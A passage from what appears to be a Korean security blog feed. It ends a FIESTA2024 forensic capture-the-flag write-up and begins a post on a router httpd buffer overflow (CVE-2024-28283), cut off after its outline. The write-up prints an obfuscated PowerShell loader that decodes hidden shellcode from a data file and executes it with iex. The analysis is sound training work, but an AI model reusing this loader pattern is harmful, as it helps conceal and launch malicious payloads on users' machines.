&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$command&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$decoded_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ToArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# iex는 문자열을 명령어로서 실행하는 함수&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$command&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# 문자열 출력부&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var24&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MA==(0)&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var25&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ToInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var26&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var27&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UG93ZXJTaGVsbA==(PowerShell)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var28&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var25&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var29&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var26&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var25&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var30&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;V2VsY29tZQ==(Welcome)&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var31&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var32&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var32&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-lt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var29&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var33&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var25&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var32&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var34&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;U2NyaXB0IGhhcyBlbmRlZCBleGVjdXRpb24=(Script has ended execution)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var35&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;iex 뒤에 오는 데이터는 for문을 거쳐서 도출되는 것으로 보인다. 따라서, for문이 핵심부로 보인다.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18304&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-bor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$guide_fileData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$decoded_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var19&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$var20&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;대상 파일(Guide.idb)의 첫 55번째 byte부터 18303byte까지 18249byte를 8 byte씩 끊어서 디코딩하는 것으로 보인다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%207.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;음? 그런데 Guide.idb는 7143000 byte이다.&lt;/p&gt;

&lt;p&gt;파일의 일부만 디코딩한 결과물이 쉘코드라는 것이니&lt;/p&gt;

&lt;p&gt;파일의 전체를 디코딩하면 뭐가 나오는지 한 번 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%208.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;파일의 전체를 디코딩하도록 루프 종료 조건을 수정한 모습&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%209.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;파일 전체가 디코딩된다면 아마 명령어로는 먹히지 못할 것이라, iex 대신 Write-Host 명령어를 사용하여 디코딩된 결과값이 콘솔에 찍히도록 수정한 모습&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%2010.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그 결과, 플래그를 획득할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;FLAG: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FIESTA{h1dd3n_fl4g_y3ah}&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1&quot;&gt;FIESTA2024 S-4-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-2&quot;&gt;FIESTA2024 S-4-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://toubva.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-3&quot;&gt;FIESTA2024 S-4-3&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 28 Jan 2025 09:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/forensic/2025-01-29-FIESTA2024-S-4-1</guid>
      </item>
    
      <item>
        <title>CVE-2024-28283 분석과 KARONTE fuzzer 활용</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#-문제&quot; id=&quot;markdown-toc--문제&quot;&gt;💯 문제&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#️-조건&quot; id=&quot;markdown-toc-️-조건&quot;&gt;✏️ 조건&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#0-접근법-설정&quot; id=&quot;markdown-toc-0-접근법-설정&quot;&gt;0. 접근법 설정&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#01-탐색-범위-좁히기&quot; id=&quot;markdown-toc-01-탐색-범위-좁히기&quot;&gt;0.1. 탐색 범위 좁히기&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#02-cve-2024-28283-조사&quot; id=&quot;markdown-toc-02-cve-2024-28283-조사&quot;&gt;0.2. CVE-2024-28283 조사&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#03-취약점-분석-보고서-원본-정리&quot; id=&quot;markdown-toc-03-취약점-분석-보고서-원본-정리&quot;&gt;0.3. 취약점 분석 보고서 원본 정리&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#031-취약점-원인&quot; id=&quot;markdown-toc-031-취약점-원인&quot;&gt;0.3.1. 취약점 원인&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#032-취약점-poc&quot; id=&quot;markdown-toc-032-취약점-poc&quot;&gt;0.3.2. 취약점 PoC&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#033-취약점-익스플로잇-결과&quot; id=&quot;markdown-toc-033-취약점-익스플로잇-결과&quot;&gt;0.3.3. 취약점 익스플로잇 결과&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-실-분석-수행&quot; id=&quot;markdown-toc-1-실-분석-수행&quot;&gt;1. 실 분석 수행&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#10-karonte를-활용한-분석&quot; id=&quot;markdown-toc-10-karonte를-활용한-분석&quot;&gt;1.0. KARONTE를 활용한 분석&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#100-펌웨어-분석은-어떻게-시작해야-하는가&quot; id=&quot;markdown-toc-100-펌웨어-분석은-어떻게-시작해야-하는가&quot;&gt;1.0.0. 펌웨어 분석은 어떻게 시작해야 하는가?&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#101-karonte-input-파인&quot; id=&quot;markdown-toc-101-karonte-input-파인&quot;&gt;1.0.1. KARONTE input 파인&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#102-unpack&quot; id=&quot;markdown-toc-102-unpack&quot;&gt;1.0.2. unpack&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#11-정적-분석&quot; id=&quot;markdown-toc-11-정적-분석&quot;&gt;1.1. 정적 분석&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#110-분석-대상-파일-찾기&quot; id=&quot;markdown-toc-110-분석-대상-파일-찾기&quot;&gt;1.1.0. 분석 대상 파일 찾기&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#111-분석&quot; id=&quot;markdown-toc-111-분석&quot;&gt;1.1.1. 분석&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#12-익스플로잇-환경-셋업&quot; id=&quot;markdown-toc-12-익스플로잇-환경-셋업&quot;&gt;1.2. 익스플로잇 환경 셋업&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#13-익스플로잇-설계&quot; id=&quot;markdown-toc-13-익스플로잇-설계&quot;&gt;1.3. 익스플로잇 설계&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#14-익스플로잇&quot; id=&quot;markdown-toc-14-익스플로잇&quot;&gt;1.4. 익스플로잇&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-익스플로잇을-통해-가능한-침해-시나리오&quot; id=&quot;markdown-toc-2-익스플로잇을-통해-가능한-침해-시나리오&quot;&gt;2. 익스플로잇을 통해 가능한 침해 시나리오&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-mitigation-제시&quot; id=&quot;markdown-toc-3-mitigation-제시&quot;&gt;3. Mitigation 제시&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;-문제&quot;&gt;💯 문제&lt;/h1&gt;

&lt;p class=&quot;notice&quot;&gt;주어진 펌웨어 내 실행 파일을 추출하여 분석하고, 어떤 1-day 취약점이 존재하는지 분석하라.&lt;/p&gt;

&lt;h3 id=&quot;️-조건&quot;&gt;✏️ 조건&lt;/h3&gt;

&lt;ul class=&quot;notice&quot;&gt;
  &lt;li&gt;E1000 라우터 펌웨어&lt;/li&gt;
  &lt;li&gt;실행파일 이름: httpd&lt;/li&gt;
  &lt;li&gt;사용자 입력 함수: get_cgi&lt;/li&gt;
  &lt;li&gt;취약점 종류: buffer overflow&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/FW_E1000_2.1.03.005_US_20140321.bin&quot;&gt;FW_E1000_2.1.03.005_US_20140321.bin&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-접근법-설정&quot;&gt;0. 접근법 설정&lt;/h1&gt;

&lt;h2 id=&quot;01-탐색-범위-좁히기&quot;&gt;0.1. 탐색 범위 좁히기&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;1-day 취약점이 존재한다 → 이미 정보가 공개된 취약점&lt;/li&gt;
  &lt;li&gt;취약점의 정보가 공개되어 있다 → 높은 확률로 CVE를 받았다&lt;/li&gt;
